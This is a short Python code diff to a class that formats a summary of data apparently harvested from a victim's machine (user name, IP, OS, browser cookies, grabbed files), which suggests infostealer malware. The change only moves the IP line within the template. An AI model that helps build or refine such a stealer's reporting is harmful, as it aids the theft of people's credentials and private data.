@@ -115,7 +115,6 @@ class MemoryStorage:
 
         preview = dedent(f'''
         🖥️ User: {computer["User"]}
-        🌐 IP: {computer["IP"]}
         📋 OS Name: {computer["OS"]}
         
         🍪 Cookies: {browsers["Cookies"]}
@@ -133,6 +132,8 @@ class MemoryStorage:
         
         📝 Grabbed files:
         {grabbers}
+
+        🌐 IP: {computer["IP"]}
         ''')
 
         return preview
